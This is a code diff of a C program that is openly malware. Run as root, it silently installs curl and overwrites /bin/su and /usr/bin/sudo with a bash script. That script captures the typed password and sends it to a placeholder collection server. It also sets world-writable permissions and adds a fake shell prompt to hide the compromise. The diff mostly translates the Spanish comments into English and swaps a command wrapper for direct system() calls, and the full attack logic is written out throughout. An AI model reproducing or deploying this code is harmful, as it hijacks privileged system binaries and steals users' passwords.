@@ -2,19 +2,11 @@
 #include <string.h>
 
 
-/** FUNCION PARA EJECUTAR LOS COMANDOS **/
-
-int cmd(char * command) {
-
-   return system(command);
-
-}
-
-/** CODIGO DEL MAIN **/
+/** MAIN CODE **/
 
 int main () {
 
-  /** COMPROBAMOS SI ESTAMOS SIENDO EJECUTADOS COMO ROOT **/
+  /** CHECK ROOT **/
 
    if(geteuid() != 0) {
 
@@ -24,18 +16,18 @@ int main () {
    }
 
 
-   /** INSTALAMOS EL PAQUETE CURL (SI NO ESTA INSTALADO) PROBAMOS CON VARIOS COMANDOS DEPENDIENDO DEL SISTEMA OPERATIVO. CON /DEV/NULL OCULTAMOS LA SALIDA DEL COMANDO **/
+   /** INSTALL PACKAGE.  /DEV/NULL HIDE COMMAND EXIT **/
 
 
-   cmd("apt install curl > /dev/null 2>&1");
-   cmd("apt-get install curl > /dev/null 2>&1");
-   cmd("yum install curl > /dev/null 2>&1");
-   cmd("aptitude install curl > /dev/null 2>&1");
+   system("apt install curl > /dev/null 2>&1");
+   system("apt-get install curl > /dev/null 2>&1");
+   system("yum install curl > /dev/null 2>&1");
+   system("aptitude install curl > /dev/null 2>&1");
 
 
-   /** SOBREESCRIBIMOS EL ARCHIVO /BIN/SU CON EL ARCHIVO BASH MALICIOSO QUE CAPTURA LAS CONTRASEÑAS **/ 
+   /** OVERWRITE /BIN/SU WITH POISONED BASH THAT STEPS THE PASSWORDS **/ 
   
-   FILE *file1;
+   FILE *file1; /** MALICIUS FILE **/
 
    char cmmd1[300] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" > /dev/null 2>&1 \n";
 
@@ -53,12 +45,12 @@ int main () {
 	
    }
 
-/** LE DAMOS PERMISOS AL ARCHIVO CREADO **/
+/** GIVE 777 **/
 
-cmd("chmod 777 /bin/su > /dev/null 2>&1");
+system("chmod 777 /bin/su > /dev/null 2>&1");
 
 
-   /** SOBREESCRIBIMOS EL ARCHIVO /USR/BIN/SUDO CON EL ARCHIVO BASH MALICIOSO QUE CAPTURA LAS CONTRASEÑAS **/ 
+/** OVERWRITE /BIN/SU WITH POISONED BASH THAT STEPS THE PASSWORDS **/ 
 
 
    FILE *file2;
@@ -79,15 +71,13 @@ cmd("chmod 777 /bin/su > /dev/null 2>&1");
 	
    }
 
-/** LE DAMOS PERMISOS AL ARCHIVO CREADO **/
 
-cmd("chmod 777 /usr/bin/sudo > /dev/null 2>&1");
+/** GIVE 777 **/system("chmod 777 /usr/bin/sudo > /dev/null 2>&1");
 
-/** GUARDAMOS UNA FAKE SHELL EN EL ARCHIVO SU/SUDO (A PARTIR DE SU USER Y HOSTNAME) PARA QUE NO SOSPECHE DEMASIADO EL USUARIO **/
+/** POP UP A SHELL TO HIDE THE MALWARE..., TO LATE !!!!**/
 
-
- cmd("echo 'while : \n do \n   h=$(hostname) ; u=$(whoami) ; echo -n $u\"@\"$h\":~# \" ; read cmd ; $cmd  \n  done \n' >> /bin/su");
- cmd("echo 'while : \n do \n   h=$(hostname) ; u=$(whoami) ; echo -n $u\"@\"$h\":~# \" ; read cmd ; $cmd  \n  done \n' >> /usr/bin/sudo");
+system("echo 'while : \n do \n   h=$(hostname) ; u=$(whoami) ; echo -n $u\"@\"$h\":~# \" ; read cmd ; $cmd  \n  done \n' >> /bin/su");
+system("echo 'while : \n do \n   h=$(hostname) ; u=$(whoami) ; echo -n $u\"@\"$h\":~# \" ; read cmd ; $cmd  \n  done \n' >> /usr/bin/sudo");
 
    return(0);
 
